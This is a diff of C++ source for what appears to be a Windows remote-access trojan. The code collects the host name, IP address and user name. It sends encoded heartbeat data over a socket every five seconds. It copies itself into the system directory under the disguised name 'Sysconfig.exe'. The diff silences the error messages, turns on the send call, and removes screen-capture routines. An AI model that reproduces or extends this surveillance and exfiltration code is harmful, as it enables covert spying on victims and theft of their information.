@@ -5,7 +5,7 @@ bool init_Socket()
 	WSADATA data;
 	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ：Windows异步套接字
 	{
-		err("WSAStartup");
+		//err("WSAStartup");
 		return false;
 	}
 	return true;
@@ -15,7 +15,7 @@ bool close_Socket()
 {
 	if (WSACleanup() != 0)
 	{
-		err("WSACleanup");
+		//err("WSACleanup");
 		return false;
 	}
 	return true;
@@ -32,7 +32,7 @@ SOCKET CreatServerScoket()
 	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (fd == INVALID_SOCKET)
 	{
-		err("SOCKET");
+		//err("SOCKET");
 	}
 	//2、绑定ip地址和端口号
 	struct sockaddr_in addr;
@@ -42,7 +42,7 @@ SOCKET CreatServerScoket()
 
 	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
 	{
-		err("bind");
+		//err("bind");
 		return false;
 	}
 	//3、监听电话：
@@ -61,7 +61,7 @@ SOCKET CreatClientScoket(const char* ip)
 	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (fd == INVALID_SOCKET)
 	{
-		err("SOCKET");
+		//err("SOCKET");
 	}
 	//2、绑定ip地址和端口号
 	struct sockaddr_in addr;
@@ -71,7 +71,7 @@ SOCKET CreatClientScoket(const char* ip)
 	//3、与服务器建立连接
 	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
 	{
-		err("connect");
+		//err("connect");
 		return false;
 	}
 	return fd;
@@ -82,12 +82,12 @@ bool getmessage(struct PC_Message* messages)
 	DWORD NameLen = BUFSIZ;
 	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
 	{
-		err("PCName");
+		//err("PCName");
 	}
 	struct hostent* p = gethostbyname(messages->PCName);
 	if (p == 0)
 	{
-		err("host and IP");
+		//err("host and IP");
 	}
 	else
 	{
@@ -101,7 +101,7 @@ bool getmessage(struct PC_Message* messages)
 	}
 	if (!GetUserName(messages->UserName, &NameLen))
 	{
-		err("UserName");
+		//err("UserName");
 	}
 	return true;
 }
@@ -122,7 +122,7 @@ bool HeartBeat(SOCKET fd)
 	encode(buf);
 	while (true)
 	{
-		//send(fd, buf, sizeof(buf), 0);
+		send(fd, buf, sizeof(buf), 0);
 		cout << buf << endl;
 		Sleep(5000);
 	}
@@ -214,7 +214,7 @@ bool base58decode(unsigned char* src)  // 解码
 	for (i = 0; i < ret + rlen - rptr; i++)
 		ret[i] = rptr[i];
 	ret[i] = 0;
-	memcpy(src, ret, strlen((char*)src));
+	memcpy(src, ret, strlen((char*)src) + 1);
 	return true;
 }
 
@@ -312,42 +312,12 @@ void encode(char* text)
 
 void decode(char* pwd)
 {
-	base58decode((unsigned char*)pwd);
 	base64decode(pwd);
+	unsigned char s[BUFSIZ * 2] = { 0 };
+	memcpy(s, pwd, strlen(pwd) + 1);
+	base58decode(s);
+	strcpy(pwd, (char*)s);
 }
-
-void ScreenShot(LPCTSTR s)
-{
-	HDC hdcSrc = GetDC(NULL);
-	int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);//像素
-	int nWidth = GetDeviceCaps(hdcSrc, HORZRES);//宽
-	int nHeight = GetDeviceCaps(hdcSrc, VERTRES);//高
-	CImage image;
-	image.Create(nWidth, nHeight, nBitPerPixel);
-	BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);//用于从原设备中复制位图到目标设备
-															//SRCCOPY 直接复制源设备区域到目标设备中
-	ReleaseDC(NULL, hdcSrc);
-	image.ReleaseDC();
-	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
-}
-
-//void readSrc(SOCKET fd)
-//{
-//	// 1. 打开图片文件
-//	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
-//	// 2. 计算图片长度
-//	Src.seekg(0, Src.end);  //将文件流指针定位到流的末尾
-//	int length = Src.tellg();
-//	Src.seekg(0, Src.beg);  //将文件流指针重新定位到流的开始
-//	// 3. 创建内存缓存区
-//	char* buffer = new char[length];
-//	// 4. 读取图片
-//	Src.read(buffer, length);
-//	// 到此，图片已经成功的被读取到内存（buffer）中
-//	cout << buffer << endl;
-//	//send(fd, buffer, strlen(buffer), 0);
-//	delete[] buffer;
-//}
 
 void GetFileName(char FileName[FileNameRow][FileNameCol])
 {
@@ -435,124 +405,6 @@ int copySelf(char* path)
 	sprintf(path, "%s\\Sysconfig.exe", sysPath);
 	//将文件复制到系统目录
 	CopyFile((LPWSTR)fileName, (LPWSTR)path, TRUE);
-	return 0;
-}
-
-int CaptureImage(HWND hwnd, CHAR* dirPath, CHAR* filename)
-{
-	HANDLE hDIB;
-	HANDLE hFile;
-	DWORD dwBmpSize;
-	DWORD dwSizeofDIB;
-	DWORD dwBytesWritten;
-	CHAR FilePath[MAX_PATH];
-	HBITMAP hbmScreen = NULL;
-	BITMAP bmpScreen;
-	BITMAPFILEHEADER bmfHeader;
-	BITMAPINFOHEADER bi;
-	CHAR* lpbitmap;
-	INT width = GetSystemMetrics(SM_CXSCREEN);  // 屏幕宽
-	INT height = GetSystemMetrics(SM_CYSCREEN);  // 屏幕高
-	HDC hdcScreen = GetDC(NULL); // 全屏幕DC
-	HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // 创建兼容内存DC
-
-	if (!hdcMemDC) goto done;
-
-	// 通过窗口DC 创建一个兼容位图
-	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
-
-	if (!hbmScreen) goto done;
-
-	// 将位图块传送到兼容内存DC中
-	SelectObject(hdcMemDC, hbmScreen);
-	if (!BitBlt(
-		hdcMemDC,    // 目的DC
-		0, 0,        // 目的DC的 x,y 坐标
-		width, height, // 目的 DC 的宽高
-		hdcScreen,   // 来源DC
-		0, 0,        // 来源DC的 x,y 坐标
-		SRCCOPY))    // 粘贴方式
-		goto done;
-
-	// 获取位图信息并存放在 bmpScreen 中
-	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
-
-	bi.biSize = sizeof(BITMAPINFOHEADER);
-	bi.biWidth = bmpScreen.bmWidth;
-	bi.biHeight = bmpScreen.bmHeight;
-	bi.biPlanes = 1;
-	bi.biBitCount = 32;
-	bi.biCompression = BI_RGB;
-	bi.biSizeImage = 0;
-	bi.biXPelsPerMeter = 0;
-	bi.biYPelsPerMeter = 0;
-	bi.biClrUsed = 0;
-	bi.biClrImportant = 0;
-
-	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
-
-	// handle 指向进程默认的堆
-	hDIB = GlobalAlloc(GHND, dwBmpSize);
-	lpbitmap = (char*)GlobalLock(hDIB);
-
-	// 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.
-	GetDIBits(
-		hdcScreen,  // 设备环境句柄
-		hbmScreen,  // 位图句柄
-		0,          // 指定检索的第一个扫描线
-		(UINT)bmpScreen.bmHeight, // 指定检索的扫描线数
-		lpbitmap,   // 指向用来检索位图数据的缓冲区的指针
-		(BITMAPINFO*)&bi, // 该结构体保存位图的数据格式
-		DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
-	);
-
-
-	wsprintf((LPWSTR)FilePath, (LPWSTR)"%s\\%s.bmp", dirPath, filename);
-
-	// 创建一个文件来保存文件截图
-	hFile = CreateFile(
-		(LPWSTR)FilePath,
-		GENERIC_WRITE,
-		0,
-		NULL,
-		CREATE_ALWAYS,
-		FILE_ATTRIBUTE_NORMAL,
-		NULL
-	);
-
-	// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
-	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-
-	// 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方
-	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
-
-	// 文件大小
-	bmfHeader.bfSize = dwSizeofDIB;
-
-	// 位图的 bfType 必须是字符串 "BM"
-	bmfHeader.bfType = 0x4D42; //BM
-
-	dwBytesWritten = 0;
-	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
-	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
-	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
-
-	// 解锁堆内存并释放
-	GlobalUnlock(hDIB);
-	GlobalFree(hDIB);
-
-	// 关闭文件句柄
-	CloseHandle(hFile);
-
-	// 清理资源
-done:
-	DeleteObject(hbmScreen);
-	DeleteObject(hdcMemDC);
-	ReleaseDC(NULL, hdcScreen);
-
-	Sleep(200);
-	//bmptojpg24x("screen.bmp", "screen.jpg", 50);
-
 	return 0;
 }
 
